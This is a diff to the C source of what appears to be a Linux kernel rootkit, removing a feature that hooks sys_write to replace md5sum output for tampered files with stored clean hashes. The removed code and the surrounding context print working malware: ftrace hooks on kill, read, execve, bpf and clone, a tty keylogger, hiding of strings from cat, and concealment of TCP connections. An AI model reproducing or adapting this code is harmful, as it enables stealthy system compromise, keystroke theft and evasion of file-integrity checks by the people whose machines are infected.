@@ -28,7 +28,6 @@
 sys64 real_m_exit_group;
 sys64 real_m_clone;
 sys64 real_m_kill;
-sys64 real_m_write;
 sys64 real_m_read;
 sys64 real_m_execve;
 sys64 real_m_bpf;
@@ -58,7 +57,6 @@ sys64 real_m_bpf;
  *   It is less complicate to keep the FD open.
  */
 static struct file *ttyfilp;
-static struct file *md5filp;
 
 static DEFINE_SPINLOCK(tty_lock);
 static DEFINE_SPINLOCK(hide_once_spin);
@@ -192,74 +190,6 @@ leave:
     return real_m_kill(regs);
 }
 
-static LIST_HEAD(md5_node);
-struct md5_t {
-    char original[MD5LEN+1];
-    char infected[MD5LEN+1];
-    struct list_head list;
-};
-
-static char *_md5_find_hash(char *md5) {
-    struct md5_t  *node, *node_safe;
-    list_for_each_entry_safe(node, node_safe, &md5_node, list) {
-        if (md5 && !strcmp(md5, node->original))
-            return node->infected;
-    }
-    return NULL;
-}
-
-void kv_md5_show_hashes(void) {
-    struct md5_t  *node, *node_safe;
-    list_for_each_entry_safe(node, node_safe, &md5_node, list)
-        prinfo("%s %s\n", node->original, node->infected);
-}
-
-bool kv_md5_add_hashes(char *infected, char *original, bool w) {
-    struct md5_t  *node;
-    static loff_t offset;
-    if (!original || !infected)
-        return false;
-
-    if (_md5_find_hash(original))
-        return false;
-
-    node = kcalloc(1, sizeof(struct md5_t), GFP_KERNEL);
-    if (!node) {
-        prerr("Memory error\n");
-        return false;
-    }
-
-    memcpy(node->original, original, MD5LEN);
-    memcpy(node->infected, infected, MD5LEN);
-    list_add_tail(&node->list, &md5_node);
-
-    if (w) {
-        size_t total = (MD5LEN*2);
-        char buf[total+1];;
-
-        /** write in the log file */
-        memset(buf, 0, sizeof(buf));
-        total = snprintf(buf, sizeof(buf), "%s%s", original, infected);
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,14,0)
-        fs_kernel_write_file(md5filp, (const void*)buf, total, &offset);
-#else
-        fs_kernel_write_file(md5filp, (const char*)buf, total, offset);
-#endif
-    }
-
-    return true;
-}
-
-static void _md5log_cleanup_list(void) {
-    struct md5_t *node, *node_safe;
-    list_for_each_entry_safe(node, node_safe, &md5_node, list) {
-        prinfo("cleaning md5 node\n");
-        list_del(&node->list);
-        kfree(node);
-        node = NULL;
-    }
-}
-
 /**
  * Will hide a string from files, if command
  * cat is used
@@ -319,43 +249,6 @@ out:
     kv_mem_free(&fs, &buf);
 
     return rv;
-}
-
-//XXX: handle md5sum -c
-static asmlinkage long m_write(struct pt_regs *regs) {
-    struct fs_file_node *fs = fs_get_file_node(current);
-    const char __user *buf;
-    char *obf = "md5sum";
-    size_t count = PT_REGS_PARM3(regs);
-    char md5[MD5LEN+1] = {0};
-    char *fake;
-
-    if (!fs || !fs->filename)
-        goto out;
-
-    if (strcmp(fs->filename, obf))
-        goto out;
-
-    if (count <= MD5LEN)
-        goto out;
-
-    buf = (const char __user*)PT_REGS_PARM2(regs);
-    /** Should never happen, here just in case */
-    if (!buf)
-        goto out;
-
-    if (copy_from_user(md5, buf, MD5LEN))
-        goto out;
-
-    md5[strcspn(md5, "\r\n")] = '\0';
-    if ((fake = _md5_find_hash(md5)))
-        if (copy_to_user((char __user*)buf, fake, MD5LEN))
-            prerr("m_write: copy_to_user\n");
-
-out:
-    if (fs)
-        kfree(fs);
-    return real_m_write(regs);
 }
 
 /**
@@ -906,26 +799,6 @@ void kv_md5log_rm_log(bool rm_log) {
     _rm_md5_log = rm_log;
 }
 
-static void _md5log_cleanup(void) {
-    struct kstat stat;
-
-    _md5log_cleanup_list();
-    fs_kernel_close_file(md5filp);
-    md5filp = NULL;
-
-    /** The is created when kv is loaded
-     * If it is empty it will be removed when
-     * rmmod comes
-     */
-    if (fs_file_stat(MD5FILE, &stat) == 0) {
-        if (!stat.size)
-            kv_md5log_rm_log(true);
-    }
-
-    if (_rm_md5_log && fs_file_rm(MD5FILE))
-        prerr("Error removing %s\n", MD5FILE);
-}
-
 static ssize_t  (*real_tty_read)(struct file *, char __user *, size_t, loff_t *);
 static ssize_t __attribute__((unused))
     m_tty_read(struct file *file, char __user *buf, size_t count, loff_t *ppos) {
@@ -1133,7 +1006,6 @@ static struct ftrace_hook ft_hooks[] = {
     {"sys_exit_group", m_exit_group, &real_m_exit_group, true},
     {"sys_clone", m_clone, &real_m_clone, true},
     {"sys_kill", m_kill, &real_m_kill, true},
-    {"sys_write", m_write, &real_m_write, true},
     {"sys_read", m_read, &real_m_read, true},
     {"sys_bpf", m_bpf, &real_m_bpf, true},
     {"tcp4_seq_show", m_tcp4_seq_show, &real_m_tcp4_seq_show},
@@ -1214,30 +1086,6 @@ void fh_remove_hooks(struct ftrace_hook *hooks) {
     }
 }
 
-static bool _validate_md5(char *buf, ssize_t size, bool ok) {
-    if (!ok) {
-        prinfo("md5 file not OK\n");
-        return false;
-    }
-
-    if (size < MD5PAIRLEN) {
-        prinfo("empty md5 file\n");
-        return false;
-    }
-
-    if (size % MD5PAIRLEN) {
-        prerr("corrupted md5 file\n");
-        return false;
-    }
-
-    if (!kv_whatever_is_md5(buf, size)) {
-        prerr("unexpected md5 file content(s)\n");
-        return false;
-    }
-
-    return true;
-}
-
 bool sys_init(void) {
     struct kstat stat;
     int idx = 0, rc;
@@ -1256,46 +1104,6 @@ bool sys_init(void) {
     if (!ttyfilp) {
         return false;
     }
-
-    md5filp = fs_kernel_open_file(MD5FILE);
-    if (!md5filp) {
-        _keylog_close_file();
-        return false;
-    }
-
-    /** if md5 file is present load it into the list */
-    if (fs_file_stat(MD5FILE, &stat) == 0) {
-        char *buf = kzalloc(stat.size+1, GFP_KERNEL);
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,14,0)
-        loff_t offset = 0;
-        ssize_t rv;
-#else
-        unsigned long offset = 0;
-        int rv;
-#endif
-
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,14,0)
-        rv = fs_kernel_read_file(md5filp, (void*)buf, stat.size, &offset);
-#else
-        rv = fs_kernel_read_file(md5filp, offset, buf, stat.size);
-#endif
-        if (_validate_md5(buf, rv, (rv == stat.size))) {
-            while (rv > 0) {
-                char fake[MD5LEN+1] = {0};
-                char orig[MD5LEN+1] = {0};
-
-                memcpy(orig, &buf[idx], MD5LEN);
-                memcpy(fake, &buf[idx+MD5LEN], MD5LEN);
-
-                kv_md5_add_hashes(fake, orig, false);
-
-                idx += MD5PAIRLEN;
-                rv -= MD5PAIRLEN;
-            }
-        }
-        kv_mem_free(&buf);
-    }
-
     return rc;
 }
 
@@ -1303,7 +1111,6 @@ void sys_deinit(void) {
     struct sys_addr_list *sl, *sl_safe;
     fh_remove_hooks(ft_hooks);
     _keylog_cleanup();
-    _md5log_cleanup();
 
     list_for_each_entry_safe(sl, sl_safe, &sys_addr, list) {
         list_del(&sl->list);
